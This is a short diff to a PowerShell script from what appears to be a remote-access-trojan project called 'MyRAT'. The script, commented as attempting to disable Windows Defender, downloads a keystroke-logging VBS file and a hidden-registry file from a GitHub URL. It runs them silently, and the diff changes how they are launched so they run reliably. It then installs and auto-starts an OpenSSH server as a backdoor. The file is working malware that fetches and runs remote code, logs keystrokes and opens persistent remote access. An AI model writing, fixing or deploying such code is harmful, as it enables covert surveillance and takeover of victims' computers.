@@ -4,7 +4,7 @@ function random_text {
 # Attempt to disable Windows Defender
 $tmp = $env:temp
 cd $tmp
-$new_folder = random_text()
+$new_folder = random_text
 mkdir $new_folder
 cd $new_folder
 
@@ -35,8 +35,8 @@ $vbs_script = random_text
 $reg = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/reghidden.reg -OutFile "$reg.reg" 
-powershell -windowstyle hiddne -ep bypass ".\$reg.reg";powershell -windowstyle hidden -ep bypass "$vbs_script.vbs"
-
+Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$reg.reg`"" -NoNewWindow -Wait
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs_script.vbs`"" -NoNewWindow -Wait
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
